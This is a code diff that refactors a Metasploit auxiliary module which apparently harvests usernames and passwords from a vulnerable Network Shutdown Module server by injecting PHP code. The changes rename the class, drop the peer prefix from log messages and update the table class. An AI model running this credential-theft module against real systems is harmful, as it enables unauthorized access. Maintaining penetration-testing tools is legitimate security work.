@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
@@ -78,11 +78,11 @@ class Metasploit3 < Msf::Auxiliary
     } die();
     EOT
 
-    print_status("#{peer} - Reading user credentials from the database")
+    print_status("Reading user credentials from the database")
     response = execute_php_code(php)
 
     if not response or response.code != 200 then
-      print_error("#{peer} - Failed: Error requesting page")
+      print_error("Failed: Error requesting page")
       return
     end
 
@@ -93,12 +93,12 @@ class Metasploit3 < Msf::Auxiliary
   def run
     credentials = read_credentials
     if credentials.empty?
-      print_warning("#{peer} - No credentials collected.")
-      print_warning("#{peer} - Sometimes this is because the server isn't in the vulnerable state.")
+      print_warning("No credentials collected.")
+      print_warning("Sometimes this is because the server isn't in the vulnerable state.")
       return
     end
 
-    cred_table = Rex::Ui::Text::Table.new(
+    cred_table = Rex::Text::Table.new(
       'Header'  => 'Network Shutdown Module Credentials',
       'Indent'  => 1,
       'Columns' => ['Username', 'Password']
